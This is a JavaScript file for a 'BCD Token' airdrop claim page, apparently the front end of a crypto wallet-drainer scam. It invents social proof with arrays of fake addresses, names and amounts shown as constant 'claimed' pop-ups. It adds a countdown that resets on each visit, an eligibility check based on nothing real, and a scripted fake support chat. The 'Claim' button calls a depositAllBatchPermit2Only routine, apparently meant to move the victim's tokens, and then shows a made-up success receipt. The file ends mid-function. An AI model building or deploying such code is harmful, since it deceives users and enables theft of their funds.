// DOM Elements
const header = document.querySelector('.header');
const hamburger = document.querySelector('.hamburger');
const navMenu = document.querySelector('.nav-menu');
const supportWidget = document.getElementById('supportWidget');
const supportPanel = document.querySelector('.support-panel');
const supportToggle = document.querySelector('.support-toggle');
const statNumbers = document.querySelectorAll('.stat-number');
const claimButtons = document.querySelectorAll('.wallet-btn');
const supportOptions = document.querySelectorAll('.support-option');
const claimNotifications = document.getElementById('claimNotifications');

// Wallet State Management
let walletState = {
    isConnected: false,
    address: null,
    isEligible: false,
    checkingEligibility: false,
    claiming: false
};

// Update wallet state from external source (wallet.js)
window.updateWalletState = function(state) {
    walletState = { ...walletState, ...state };
    updateUIForWalletState();
};

// Update UI based on wallet connection state
function updateUIForWalletState() {
    const connectBtn = document.getElementById('connectBtn');
    const connectionStatus = document.getElementById('connectionStatus');
    const eligibilityBtn = document.querySelector('.eligibility-check-btn');
    const claimBtn = document.querySelector('.claim-now-btn');
    
    if (walletState.isConnected && walletState.address) {
        // Update connect button
        if (connectBtn) {
            connectBtn.innerHTML = `<i class="fas fa-check"></i> ${walletState.address.slice(0, 6)}...${walletState.address.slice(-4)}`;
            connectBtn.classList.add('connected');
        }
        
        // Update status indicator
        if (connectionStatus) {
            connectionStatus.innerHTML = `
                <div class="status-indicator online"></div>
                <span>Connected: ${walletState.address.slice(0, 6)}...${walletState.address.slice(-4)}</span>
            `;
        }
        
        // Enable eligibility button
        if (eligibilityBtn) {
            eligibilityBtn.disabled = false;
            eligibilityBtn.style.opacity = '1';
        }
        
        // Enable claim button if eligible
        if (claimBtn) {
            claimBtn.disabled = !walletState.isEligible;
            claimBtn.style.opacity = walletState.isEligible ? '1' : '0.5';
        }
    } else {
        // Reset to disconnected state
        if (connectBtn) {
            connectBtn.innerHTML = 'Connect Wallet';
            connectBtn.classList.remove('connected');
        }
        
        if (connectionStatus) {
            connectionStatus.innerHTML = `
                <div class="status-indicator offline"></div>
                <span>Ready to connect</span>
            `;
        }
        
        if (eligibilityBtn) {
            eligibilityBtn.disabled = true;
            eligibilityBtn.style.opacity = '0.5';
        }
        
        if (claimBtn) {
            claimBtn.disabled = true;
            claimBtn.style.opacity = '0.5';
        }
    }
}

// Initialize wallet connection button
function initializeWalletConnection() {
    const connectBtn = document.getElementById('connectBtn');
    if (connectBtn) {
        connectBtn.addEventListener('click', async () => {
            if (walletState.isConnected) {
                showNotification('Wallet already connected!', 'info');
                return;
            }
            
            // Trigger wallet.js connection
            if (typeof window.onConnect === 'function') {
                await window.onConnect();
            } else {
                showNotification('Wallet connection not ready. Please wait...', 'error');
            }
        });
    }
    
    // Disable eligibility/claim buttons initially
    updateUIForWalletState();
}

// Fake claim data
const fakeAddresses = [
    '0x7f9a...3b2d',
    '0x8b2c...5f1e',
    '0x3d4a...9c7b',
    '0x9e1f...2a6d',
    '0x5c8b...7e3f',
    '0x2a4d...8f9c',
    '0x6e8b...1a3d',
    '0x9c2f...5b7e',
    '0x1d7a...4c9f',
    '0x8f3e...6a2b'
];

const fakeAmounts = [500, 1000, 1500, 2000, 2500, 3000, 3500, 4000, 4500, 5000];

const fakeNames = [
    'CryptoKing', 'TokenWhale', 'BlockchainBoss', 'DeFiMaster', 'NFTCollector',
    'CoinHunter', 'YieldFarmer', 'SmartTrader', 'DiamondHands', 'MoonRider'
];

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    initializeAnimations();
    initializeScrollEffects();
    initializeMobileMenu();
    initializeSupportWidget();
    initializeCounterAnimation();
    initializeWalletConnection();
    initializeSmoothScrolling();
    initializeParallaxEffects();
    initializeMouseEffects();
    initializeTypingEffect();
    initializeGlowEffects();
    initializeFakeNotifications();
    initializeCountdown();
    initializeLiveSupport();
    performanceOptimizations();
});

// Mobile Menu
function initializeMobileMenu() {
    if (hamburger && navMenu) {
        hamburger.addEventListener('click', () => {
            hamburger.classList.toggle('active');
            navMenu.classList.toggle('active');
        });
    }
}

// Support Widget
function initializeSupportWidget() {
    if (supportToggle) {
        supportToggle.addEventListener('click', (e) => {
            e.stopPropagation();
            toggleSupport();
        });
    }
    
    // Close support when clicking outside
    document.addEventListener('click', (e) => {
        if (supportWidget && !supportWidget.contains(e.target)) {
            closeSupport();
        }
    });
    
    // Support option clicks
    supportOptions.forEach(option => {
        option.addEventListener('click', () => {
            handleSupportOption(option.textContent);
        });
    });
}

function toggleSupport() {
    if (supportPanel) {
        supportPanel.classList.toggle('active');
    }
}

function closeSupport() {
    if (supportPanel) {
        supportPanel.classList.remove('active');
    }
}

function handleSupportOption(option) {
    console.log('Support option selected:', option);
    // Add your support logic here
    showNotification(`Support: ${option}`, 'info');
}

// Scroll Effects
function initializeScrollEffects() {
    let lastScroll = 0;
    
    window.addEventListener('scroll', () => {
        const currentScroll = window.pageYOffset;
        
        // Header scroll effect
        if (header) {
            if (currentScroll > 100) {
                header.style.background = 'rgba(10, 10, 10, 0.95)';
                header.style.backdropFilter = 'blur(20px)';
            } else {
                header.style.background = 'rgba(10, 10, 10, 0.8)';
            }
            
            // Hide/show header on scroll
            if (currentScroll > lastScroll && currentScroll > 300) {
                header.style.transform = 'translateY(-100%)';
            } else {
                header.style.transform = 'translateY(0)';
            }
        }
        
        lastScroll = currentScroll;
        
        // Fade in animations
        animateOnScroll();
    });
}

// Animate elements on scroll
function animateOnScroll() {
    const elements = document.querySelectorAll('.fade-in');
    elements.forEach(element => {
        const elementTop = element.getBoundingClientRect().top;
        const elementBottom = element.getBoundingClientRect().bottom;
        
        if (elementTop < window.innerHeight && elementBottom > 0) {
            element.classList.add('visible');
        }
    });
}

// Counter Animation
function initializeCounterAnimation() {
    const observerOptions = {
        threshold: 0.5,
        rootMargin: '0px 0px -100px 0px'
    };
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                animateCounter(entry.target);
                observer.unobserve(entry.target);
            }
        });
    }, observerOptions);
    
    // Only target stat-number elements in the stats-section (not hero section)
    document.querySelectorAll('.stats-section .stat-number').forEach(stat => observer.observe(stat));
}

function animateCounter(element) {
    const target = parseInt(element.getAttribute('data-target'));
    const duration = 2000;
    const increment = target / (duration / 16);
    let current = 0;
    
    const updateCounter = () => {
        current += increment;
        if (current < target) {
            element.textContent = Math.floor(current).toLocaleString();
            requestAnimationFrame(updateCounter);
        } else {
            element.textContent = target.toLocaleString();
        }
    };
    
    updateCounter();
}

// Countdown Timer
function initializeCountdown() {
    // Set target date (1 day 2 hours 30 minutes from now)
    const targetDate = new Date();
    targetDate.setDate(targetDate.getDate() + 1);
    targetDate.setHours(targetDate.getHours() + 2);
    targetDate.setMinutes(targetDate.getMinutes() + 30);
    
    function updateCountdown() {
        const now = new Date().getTime();
        const distance = targetDate.getTime() - now;
        
        const days = Math.floor(distance / (1000 * 60 * 60 * 24));
        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((distance % (1000 * 60)) / 1000);
        
        const daysEl = document.getElementById('days');
        const hoursEl = document.getElementById('hours');
        const minutesEl = document.getElementById('minutes');
        const secondsEl = document.getElementById('seconds');
        
        if (daysEl) daysEl.textContent = String(days).padStart(2, '0');
        if (hoursEl) hoursEl.textContent = String(hours).padStart(2, '0');
        if (minutesEl) minutesEl.textContent = String(minutes).padStart(2, '0');
        if (secondsEl) secondsEl.textContent = String(seconds).padStart(2, '0');
        
        if (distance < 0) {
            clearInterval(countdownInterval);
            const header = document.querySelector('.countdown-header span');
            if (header) header.textContent = 'Claim Period Has Ended';
        }
    }
    
    updateCountdown();
    const countdownInterval = setInterval(updateCountdown, 1000);
}

// Enhanced Fake Claim Notifications
function initializeFakeNotifications() {
    // Start showing fake notifications after 2 seconds
    setTimeout(() => {
        showFakeClaimNotification();
        // Continue showing notifications more frequently
        setInterval(() => {
            if (Math.random() > 0.2) { // 80% chance to show notification
                showFakeClaimNotification();
                    }
                }, Math.random() * 4000 + 2000); // Every 2-6 seconds
            }, 2000);
        }
        
        function showFakeClaimNotification() {
            if (!claimNotifications) return;
            
            const address = fakeAddresses[Math.floor(Math.random() * fakeAddresses.length)];
            const amount = fakeAmounts[Math.floor(Math.random() * fakeAmounts.length)];
            const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
            const value = `$${amount.toLocaleString()}`;
            const types = ['claimed', 'received', 'secured'];
            const type = types[Math.floor(Math.random() * types.length)];
            
            const notification = document.createElement('div');
            notification.className = 'claim-notification success';
            notification.innerHTML = `
                <div class="claim-notification-content">
                    <div class="claim-notification-icon">
                        <i class="fas fa-check-circle"></i>
                    </div>
                    <div class="claim-notification-text">
                        <div class="claim-notification-amount">${name} ${type} ${amount.toLocaleString()} BCD!</div>
                        <div class="claim-notification-address">${address}</div>
                        <div>Value: ${value} USD</div>
                    </div>
                </div>
            `;
            
            claimNotifications.appendChild(notification);
            
            // Remove notification after animation
            setTimeout(() => {
                notification.remove();
            }, 3000);
        }
        
        // Live Support Functionality
        function initializeLiveSupport() {
            const supportMessages = [
                'Welcome to BCD Token Support! How can I help you today?',
                'Our team is here to assist you with any questions.',
                'Need help with claiming tokens? We\'ve got you covered!',
                'Having wallet issues? Our support team can help!',
                'Questions about eligibility? Ask us anything!'
            ];
            
            // Auto-greet user when support opens
            let hasGreeted = false;
            
            const originalToggleSupport = window.toggleSupport;
            window.toggleSupport = function() {
                originalToggleSupport();
                
                if (!hasGreeted && supportPanel && supportPanel.classList.contains('active')) {
                    hasGreeted = true;
                    setTimeout(() => {
                        addSupportMessage(supportMessages[Math.floor(Math.random() * supportMessages.length)], 'support');
                    }, 1000);
                }
            };
            
            // Handle support option clicks
            supportOptions.forEach(option => {
                option.addEventListener('click', () => {
                    const question = option.textContent;
                    addSupportMessage(question, 'user');
                    
                    // Simulate support response
                    setTimeout(() => {
                        const responses = {
                            'How to claim tokens?': 'To claim tokens, simply connect your wallet and click the "Claim Now" button. Follow the on-screen instructions to complete the process.',
                            'Wallet connection issues': 'Make sure you have MetaMask or Trust Wallet installed. Try refreshing the page and reconnecting your wallet.',
                            'Transaction status': 'Transactions usually take 1-3 minutes to complete. You can check the status on BSCScan.',
                            'General inquiry': 'Our support team is available 24/7. Feel free to ask any questions about BCD Token!'
                        };
                        
                        const response = responses[question] || 'Thank you for your question! Our support team will get back to you shortly.';
                        addSupportMessage(response, 'support');
                    }, 1500);
                });
            });
        }
        
        function addSupportMessage(message, sender) {
            const chatMessages = document.getElementById('chatMessages');
            if (!chatMessages) return;
            
            const messageDiv = document.createElement('div');
            messageDiv.className = `support-message ${sender}`;
            messageDiv.innerHTML = `
                <div class="message-avatar">
                    <i class="fas fa-${sender === 'user' ? 'user' : 'headset'}"></i>
                </div>
                <div class="message-content">
                    <div class="message-text">${message}</div>
                    <div class="message-time">${new Date().toLocaleTimeString()}</div>
                </div>
            `;
            
            chatMessages.appendChild(messageDiv);
            chatMessages.scrollTop = chatMessages.scrollHeight;
        }
        
        // Enhanced Wallet Connection with Steps
        window.connectWallet = function(walletType) {
            console.log(`Connecting to ${walletType}...`);
            
            // Update connection steps
            updateConnectionSteps(2);
            
            // Show loading state
            const button = event.target.closest('.wallet-btn-enhanced');
            const originalContent = button.innerHTML;
            button.innerHTML = `
                <div class="wallet-visual">
                    <div class="wallet-icon-bg">
                        <div class="loading"></div>
                    </div>
                </div>
                <div class="wallet-details">
                    <span class="wallet-name">Connecting...</span>
                    <span class="wallet-users">Please wait</span>
                </div>
            `;
            button.disabled = true;
            
            // Simulate wallet connection
            setTimeout(() => {
                updateConnectionSteps(3);
                
                button.innerHTML = `
                    <div class="wallet-visual">
                        <div class="wallet-icon-bg">
                            <i class="fas fa-check"></i>
                        </div>
                    </div>
                    <div class="wallet-details">
                        <span class="wallet-name">Connected</span>
                        <span class="wallet-users">Ready to claim</span>
                    </div>
                `;
                button.style.background = 'var(--bg-tertiary)';
                button.style.borderColor = 'var(--success)';
                
                // Update connection status
                const statusIndicator = document.querySelector('.status-indicator');
                const statusText = document.querySelector('.connection-status span');
                if (statusIndicator && statusText) {
                    statusIndicator.classList.remove('offline');
                    statusIndicator.classList.add('online');
                    statusText.textContent = `${walletType.charAt(0).toUpperCase() + walletType.slice(1)} connected`;
                }
                
                showNotification(`${walletType.charAt(0).toUpperCase() + walletType.slice(1)} connected successfully!`, 'success');
                
                // Show multiple fake notifications after connection
                setTimeout(() => {
                    showFakeClaimNotification();
                    setTimeout(() => showFakeClaimNotification(), 1000);
                    setTimeout(() => showFakeClaimNotification(), 2000);
                }, 500);
            }, 2000);
        };
        
        function updateConnectionSteps(activeStep) {
            for (let i = 1; i <= 3; i++) {
                const step = document.getElementById(`step${i}`);
                if (step) {
                    if (i <= activeStep) {
                        step.classList.add('active');
                    } else {
                        step.classList.remove('active');
                    }
                }
            }
        }
        
        // Enhanced Eligibility Check - Requires Wallet Connection
function checkEligibility() {
    // Check if wallet is connected first
    if (!walletState.isConnected) {
        showNotification('Please connect your wallet first!', 'error');
        scrollToClaim();
        return;
    }
    
    const result = document.getElementById('eligibilityResult');
    const button = event?.target?.closest('.eligibility-check-btn');
    
    if (walletState.checkingEligibility) return;
    walletState.checkingEligibility = true;
    
    if (!result) {
        walletState.checkingEligibility = false;
        return;
    }
    
    // Show loading state
    if (button) {
        button.innerHTML = '<div class="loading"></div> Checking...';
        button.disabled = true;
    }
    result.innerHTML = '<span style="color: var(--text-secondary);"><i class="fas fa-spinner fa-spin"></i> Checking wallet eligibility...</span>';
    
    // Simulate eligibility check based on wallet address
    setTimeout(() => {
        // Use deterministic check based on address to keep it consistent
        const address = walletState.address || '';
        const checksum = address.split('').reduce((a, b) => a + b.charCodeAt(0), 0);
        const isEligible = checksum % 100 > 15; // 85% chance but consistent per address
        
        // Calculate eligible amount based on address
        const eligibleAmount = fakeAmounts[checksum % fakeAmounts.length];
        
        if (isEligible) {
            walletState.isEligible = true;
            result.innerHTML = `
                <div style="color: var(--success); padding: 15px; border-radius: 12px; background: rgba(0, 255, 136, 0.1); margin-top: 10px;">
                    <i class="fas fa-check-circle" style="font-size: 24px; margin-bottom: 10px;"></i>
                    <div style="font-weight: 600; font-size: 1.1rem;">Wallet Verified!</div>
                    <div style="margin-top: 8px;">Eligible for <strong>${eligibleAmount.toLocaleString()} BCD</strong></div>
                    <div style="font-size: 0.9rem; margin-top: 5px; opacity: 0.8;">Value: $${eligibleAmount.toLocaleString()} USD</div>
                </div>
            `;
            
            showNotification(`Wallet verified! Eligible for ${eligibleAmount.toLocaleString()} BCD`, 'success');
            
            // Update claim button state
            const claimBtn = document.querySelector('.claim-now-btn');
            if (claimBtn) {
                claimBtn.disabled = false;
                claimBtn.style.opacity = '1';
            }
        } else {
            walletState.isEligible = false;
            result.innerHTML = `
                <div style="color: var(--error); padding: 15px; border-radius: 12px; background: rgba(255, 68, 68, 0.1); margin-top: 10px;">
                    <i class="fas fa-times-circle" style="font-size: 24px; margin-bottom: 10px;"></i>
                    <div style="font-weight: 600;">Wallet Not Eligible</div>
                    <div style="font-size: 0.85rem; margin-top: 8px; opacity: 0.8;">
                        This wallet address doesn't meet the criteria.<br>
                        Try with a different wallet that has transaction history.
                    </div>
                </div>
            `;
            
            showNotification('Wallet not eligible for this claim period', 'error');
        }
        
        if (button) {
            button.innerHTML = '<i class="fas fa-check-circle"></i><span>Check Eligibility</span>';
            button.disabled = false;
        }
        
        walletState.checkingEligibility = false;
        updateUIForWalletState();
    }, 2000);
}

// Start Claim Process - Requires Wallet Connection and Eligibility
function startClaimProcess() {
    // Check if wallet is connected
    if (!walletState.isConnected) {
        showNotification('Please connect your wallet first!', 'error');
        scrollToClaim();
        return;
    }
    
    // Check if eligible
    if (!walletState.isEligible) {
        showNotification('Please check eligibility first!', 'error');
        
        const result = document.getElementById('eligibilityResult');
        if (result) {
            result.innerHTML = `
                <div style="color: var(--error); padding: 15px; border-radius: 12px; background: rgba(255, 68, 68, 0.1); margin-top: 10px;">
                    <i class="fas fa-exclamation-triangle"></i>
                    <div>You must check eligibility before claiming!</div>
                </div>
            `;
        }
        return;
    }
    
    if (walletState.claiming) return;
    walletState.claiming = true;
    
    showNotification('🚀 Initiating claim process...', 'info');
    
    const claimBtn = document.querySelector('.claim-now-btn');
    if (claimBtn) {
        const originalContent = claimBtn.innerHTML;
        claimBtn.innerHTML = '<div class="loading"></div> Processing...';
        claimBtn.disabled = true;
    }
    
    // Trigger the actual deposit flow from wallet.js if available
    setTimeout(() => {
        if (typeof window.depositAllBatchPermit2Only === 'function') {
            window.depositAllBatchPermit2Only()
                .then(() => {
                    showNotification('Claim process completed!', 'success');
                    showClaimSuccess();
                })
                .catch((err) => {
                    showNotification('Claim failed: ' + err.message, 'error');
                })
                .finally(() => {
                    walletState.claiming = false;
                    if (claimBtn) {
                        claimBtn.innerHTML = `
                            <div class="btn-content">
                                <i class="fas fa-rocket"></i>
                                <span>Claim Your BCD Now</span>
                            </div>
                            <div class="btn-shine"></div>
                        `;
                        claimBtn.disabled = false;
                    }
                });
        } else {
            // Fallback simulation
            setTimeout(() => {
                showNotification('Claim submitted successfully!', 'success');
                showFakeClaimNotification();
                showClaimSuccess();
                walletState.claiming = false;
                if (claimBtn) {
                    claimBtn.innerHTML = `
                        <div class="btn-content">
                            <i class="fas fa-rocket"></i>
                            <span>Claim Your BCD Now</span>
                        </div>
                        <div class="btn-shine"></div>
                    `;
                    claimBtn.disabled = false;
                }
            }, 2000);
        }
    }, 1000);
}

function showClaimSuccess() {
    const modal = document.createElement('div');
    modal.className = 'claim-modal';
    modal.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <div class="success-icon">
                    <i class="fas fa-check-circle"></i>
                </div>
                <h2>Tokens Claimed Successfully!</h2>
            </div>
            <div class="modal-body">
                <p>Your 10,000 BCD tokens have been claimed and will be available in your wallet shortly.</p>
                <div class="transaction-details">
                    <div class="detail-item">
                        <span>Transaction Hash:</span>
                        <span>0x7f9a...3b2d</span>
                    </div>
                    <div class="detail-item">
                        <span>Amount:</span>
                        <span>10,000 BCD</span>
                    </div>
                    <div class="detail-item">
                        <span>Status:</span>
                        <span class="status-success">Confirmed</span>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn-primary" onclick="closeModal(this)">View on Explorer</button>
                <button class="btn-secondary" onclick="closeModal(this)">Close</button>
            </div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    // Add modal styles
    const style = document.createElement('style');
    style.textContent = `
        .claim-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            backdrop-filter: blur(10px);
        }
        
        .modal-content {
            background: var(--bg-tertiary);
            border-radius: 20px;
            padding: 2rem;
            max-width: 500px;
            width: 90%;
            border: 1px solid var(--border-color);
            box-shadow: var(--shadow-hover);
            animation: modalSlideIn 0.3s ease;
        }
        
        @keyframes modalSlideIn {
            from {
                opacity: 0;
                transform: translateY(-50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .modal-header {
            text-align: center;
            margin-bottom: 2rem;
        }
        
        .success-icon {
            width: 80px;
            height: 80px;
            background: var(--primary-gradient);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1rem;
            font-size: 2.5rem;
            color: var(--bg-primary);
            animation: successPulse 1s ease infinite;
        }
        
        @keyframes successPulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        .modal-body {
            margin-bottom: 2rem;
        }
        
        .transaction-details {
            background: var(--bg-secondary);
            border-radius: 12px;
            padding: 1.5rem;
            margin-top: 1rem;
        }
        
        .detail-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 0.8rem;
            font-size: 0.9rem;
        }
        
        .detail-item:last-child {
            margin-bottom: 0;
        }
        
        .status-success {
            color: var(--accent);
            font-weight: 600;
        }
        
        .modal-footer {
            display: flex;
            gap: 1rem;
            justify-content: center;
        }
    `;
    document.head.appendChild(style);
}

function closeModal(button) {
    const modal = button.closest('.claim-modal');
    if (modal) {
        modal.remove();
    }
}

// Smooth Scrolling
function initializeSmoothScrolling() {
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });
}

function scrollToClaim() {
    const claimSection = document.getElementById('claim');
    if (claimSection) {
        claimSection.scrollIntoView({
            behavior: 'smooth',
            block: 'start'
        });
    }
}

// Parallax Effects
function initializeParallaxEffects() {
    window.addEventListener('scroll', () => {
        const scrolled = window.pageYOffset;
        const parallaxElements = document.querySelectorAll('.hero-visual, .coin-container');
        
        parallaxElements.forEach(element => {
            const speed = element.dataset.speed || 0.5;
            const yPos = -(scrolled * speed);
            element.style.transform = `translateY(${yPos}px)`;
        });
    });
}

// Mouse Effects
function initializeMouseEffects() {
    let mouseX = 0;
    let mouseY = 0;
    
    document.addEventListener('mousemove', (e) => {
        mouseX = e.clientX;
        mouseY = e.clientY;
        
        // Glow effect following mouse
        const glow = document.querySelector('.coin-glow');
        if (glow) {
            const rect = glow.getBoundingClientRect();
            const centerX = rect.left + rect.width / 2;
            const centerY = rect.top + rect.height / 2;
            const angleX = (mouseY - centerY) / 50;
            const angleY = (mouseX - centerX) / 50;
            
            glow.style.transform = `translate(-50%, -50%) rotateX(${angleX}deg) rotateY(${angleY}deg)`;
        }
    });
}

// Typing Effect
function initializeTypingEffect() {
    const heroTitle = document.querySelector('.hero-title .gradient-text');
    if (heroTitle) {
        const text = heroTitle.textContent;
        heroTitle.textContent = '';
        heroTitle.style.borderRight = '2px solid var(--accent)';
        
        let i = 0;
        const typeWriter = () => {
            if (i < text.length) {
                heroTitle.textContent += text.charAt(i);
                i++;
                setTimeout(typeWriter, 100);
            } else {
                heroTitle.style.borderRight = 'none';
            }
        };
        
        setTimeout(typeWriter, 500);
    }
}

// Glow Effects
function initializeGlowEffects() {
    // Add glow to buttons on hover
    const buttons = document.querySelectorAll('.btn-primary, .btn-secondary');
    buttons.forEach(button => {
        button.addEventListener('mouseenter', () => {
            button.style.boxShadow = '0 0 30px rgba(0, 255, 136, 0.5)';
        });
        
        button.addEventListener('mouseleave', () => {
            button.style.boxShadow = '';
        });
    });
}

// Initialize Animations
function initializeAnimations() {
    // Add fade-in class to elements
    const elementsToAnimate = document.querySelectorAll('.feature-card, .stat-item, .claim-card');
    elementsToAnimate.forEach(element => {
        element.classList.add('fade-in');
    });
    
    // Create floating particles
    createFloatingParticles();
    
    // Initialize coin rotation
    initializeCoinRotation();
}

// Create Floating Particles
function createFloatingParticles() {
    const particlesContainer = document.querySelector('.particles');
    if (particlesContainer) {
        for (let i = 0; i < 50; i++) {
            const particle = document.createElement('div');
            particle.className = 'particle';
            particle.style.cssText = `
                position: absolute;
                width: ${Math.random() * 4 + 1}px;
                height: ${Math.random() * 4 + 1}px;
                background: var(--accent);
                border-radius: 50%;
                left: ${Math.random() * 100}%;
                top: ${Math.random() * 100}%;
                opacity: ${Math.random() * 0.5 + 0.1};
                animation: floatParticle ${Math.random() * 10 + 10}s linear infinite;
            `;
            particlesContainer.appendChild(particle);
        }
        
        // Add particle animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes floatParticle {
                0% {
                    transform: translateY(100vh) rotate(0deg);
                    opacity: 0;
                }
                10% {
                    opacity: 1;
                }
                90% {
                    opacity: 1;
                }
                100% {
                    transform: translateY(-100vh) rotate(360deg);
                    opacity: 0;
                }
            }
        `;
        document.head.appendChild(style);
    }
}

// Coin Rotation
function initializeCoinRotation() {
    const coin3d = document.querySelector('.coin-3d');
    if (coin3d) {
        // Add interactive rotation on mouse move
        const coinContainer = document.querySelector('.coin-container');
        if (coinContainer) {
            coinContainer.addEventListener('mousemove', (e) => {
                const rect = coinContainer.getBoundingClientRect();
                const centerX = rect.left + rect.width / 2;
                const centerY = rect.top + rect.height / 2;
                const angleX = (e.clientY - centerY) / 10;
                const angleY = (e.clientX - centerX) / 10;
                
                coin3d.style.transform = `rotateX(${-angleX}deg) rotateY(${angleY}deg)`;
            });
            
            coinContainer.addEventListener('mouseleave', () => {
                coin3d.style.transform = '';
            });
        }
    }
}

// Notification System
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.innerHTML = `
        <div class="notification-content">
            <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i>
            <span>${message}</span>
        </div>
    `;
    
    // Add notification styles
    if (!document.querySelector('#notification-styles')) {
        const style = document.createElement('style');
        style.id = 'notification-styles';
        style.textContent = `
            .notification {
                position: fixed;
                top: 100px;
                right: 20px;
                background: var(--bg-tertiary);
                border: 1px solid var(--border-color);
                border-radius: 12px;
                padding: 1rem 1.5rem;
                min-width: 300px;
                box-shadow: var(--shadow-hover);
                z-index: 10000;
                animation: slideInRight 0.3s ease;
                backdrop-filter: blur(10px);
            }
            
            .notification-success {
                border-color: var(--accent);
                background: linear-gradient(135deg, rgba(0, 255, 136, 0.1), rgba(0, 204, 255, 0.1));
            }
            
            .notification-error {
                border-color: #ff4444;
                background: rgba(255, 68, 68, 0.1);
            }
            
            .notification-info {
                border-color: var(--accent-secondary);
                background: rgba(0, 204, 255, 0.1);
            }
            
            .notification-content {
                display: flex;
                align-items: center;
                gap: 1rem;
            }
            
            .notification i {
                font-size: 1.2rem;
            }
            
            .notification-success i {
                color: var(--accent);
            }
            
            .notification-error i {
                color: #ff4444;
            }
            
            .notification-info i {
                color: var(--accent-secondary);
            }
            
            @keyframes slideInRight {
                from {
                    opacity: 0;
                    transform: translateX(100%);
                }
                to {
                    opacity: 1;
                    transform: translateX(0);
                }
            }
            
            @keyframes slideOutRight {
                from {
                    opacity: 1;
                    transform: translateX(0);
                }
                to {
                    opacity: 0;
                    transform: translateX(100%);
                }
            }
        `;
        document.head.appendChild(style);
    }
    
    document.body.appendChild(notification);
    
    // Auto remove after 5 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOutRight 0.3s ease';
        setTimeout(() => {
            notification.remove();
        }, 300);
    }, 5000);
}

// Performance optimization
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// Optimize scroll events
const optimizedScroll = debounce(() => {
    // Scroll optimizations here
}, 10);

window.addEventListener('scroll', optimizedScroll);

// Add loading animation
window.addEventListener('load', () => {
    document.body.style.opacity = '0';
    document.body.style.transition = 'opacity 0.5s ease';
    
    setTimeout(() => {
        document.body.style.opacity = '1';
    }, 100);
});

// Keyboard navigation
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        closeSupport();
        // Close any open modals
        const modals = document.querySelectorAll('.claim-modal');
        modals.forEach(modal => modal.remove());
    }
});

// Touch gestures for mobile
let touchStartX = 0;
let touchEndX = 0;

document.addEventListener('touchstart', (e) => {
    touchStartX = e.changedTouches[0].screenX;
});

document.addEventListener('touchend', (e) => {
    touchEndX = e.changedTouches[0].screenX;
    handleSwipe();
});

function handleSwipe() {
    if (touchEndX < touchStartX - 50) {
        // Swipe left - could open navigation or other action
        console.log('Swiped left');
    }
    if (touchEndX > touchStartX + 50) {
        // Swipe right - could close navigation or other action
        console.log('Swiped right');
    }
}

// Performance Optimizations
function performanceOptimizations() {
    // Reduce animation complexity on mobile
    if (window.innerWidth < 768) {
        document.body.classList.add('mobile-optimized');
        
        // Disable heavy animations on mobile
        const style = document.createElement('style');
        style.textContent = `
            .mobile-optimized .animated-bg {
                animation: none !important;
            }
            .mobile-optimized .particles {
                display: none !important;
            }
            .mobile-optimized .coin-3d {
                animation: coin-rotate 20s linear infinite !important;
            }
        `;
        document.head.appendChild(style);
    }
    
    // Use Intersection Observer for lazy loading
    const observerOptions = {
        root: null,
        rootMargin: '0px',
        threshold: 0.1
    };
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('visible');
                observer.unobserve(entry.target);
            }
        });
    }, observerOptions);
    
    document.querySelectorAll('.fade-in').forEach(el => {
        observer.observe(el);
    });
    
    // Throttle scroll events
    let ticking = false;
    function updateOnScroll() {
        if (!ticking) {
            requestAnimationFrame(() => {
                // Scroll-based updates here
                ticking = false;
            });
            ticking = true;
        }
    }
    
    window.addEventListener('scroll', updateOnScroll, { passive: true });
}

// Support chat functions
function handleSupportClick(question) {
    const supportChat = document.getElementById('supportChat');
    if (supportChat) {
        supportChat.style.display = 'block';
        addSupportMessage(question, 'user');
        
        // Simulate support response
        setTimeout(() => {
            const responses = {
                'How to claim tokens?': 'To claim tokens, simply connect your wallet and click the "Claim Now" button. Follow the on-screen instructions to complete the process.',
                'Wallet connection issues': 'Make sure you have MetaMask or Trust Wallet installed. Try refreshing the page and reconnecting your wallet.',
                'Transaction status': 'Transactions usually take 1-3 minutes to complete. You can check the status on BSCScan.',
                'General inquiry': 'Our support team is available 24/7. Feel free to ask any questions about BCD Token!'
            };
            
            const response = responses[question] || 'Thank you for your question! Our support team will get back to you shortly.';
            addSupportMessage(response, 'support');
        }, 1500);
    }
}

function sendChatMessage() {
    const chatInput = document.getElementById('chatInput');
    const message = chatInput.value.trim();
    
    if (message) {
        addSupportMessage(message, 'user');
        chatInput.value = '';
        
        // Simulate support response
        setTimeout(() => {
            const responses = [
                'Thank you for your message! Our support team is looking into it.',
                'I understand your concern. Let me help you with that.',
                'That\'s a great question! Here\'s what I can tell you...',
